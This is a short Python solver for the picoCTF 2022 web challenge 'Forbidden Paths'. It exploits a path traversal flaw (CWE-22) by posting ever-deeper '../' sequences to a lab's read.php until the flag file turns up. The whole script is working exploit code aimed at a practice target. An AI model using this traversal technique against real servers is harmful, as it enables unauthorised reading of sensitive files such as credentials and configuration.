#!/usr/bin/env python3
"""Solver for Challenge 270 Forbidden Paths (picoCTF 2022, Web Exploitation).

Target: POST read.php with field 'filename' on the on-demand lab website.
Root cause: filter blocks absolute paths ("/flag.txt" -> "Not Authorized")
but allows relative traversal; web root is /var/www/html/ so flag at
/flag.txt is reached via ../../../flag.txt (CWE-22 Path Traversal).
Lab URL is ephemeral per instance run; pass base URL explicitly.

Usage: solve_270_forbidden_paths.py [base_url]
  Prints the academy{...} flag.
"""
import re
import sys
import urllib.parse
import urllib.request

FLAG_RE = re.compile(r"(academy\{[^}]*\}|picoCTF\{[^}]*\}|flag\{[^}]*\})")


def read(base, filename, timeout=20):
    data = urllib.parse.urlencode({"filename": filename, "read": "Read"}).encode()
    req = urllib.request.Request(base.rstrip("/") + "/read.php", data=data,
                                 headers={"User-Agent": "Mozilla/5.0"})
    return urllib.request.urlopen(req, timeout=timeout).read().decode(errors="replace")


def main():
    base = (sys.argv[1] if len(sys.argv) > 1 else "http://xebec.cylabacademy.net:36904").rstrip("/")
    body = read(base, "divine-comedy.txt")
    assert "Divine Comedy" in body or "Gutenberg" in body, "lab unreachable or broken"
    body = read(base, "/flag.txt")
    assert "Not Authorized" in body, "filter behavior changed: absolute path not blocked?"
    for depth in range(1, 8):
        trav = "../" * depth + "flag.txt"
        body = read(base, trav)
        m = FLAG_RE.search(body)
        if m:
            print(m.group(1))
            return
    print("FLAG NOT FOUND")
    sys.exit(1)


if __name__ == "__main__":
    main()
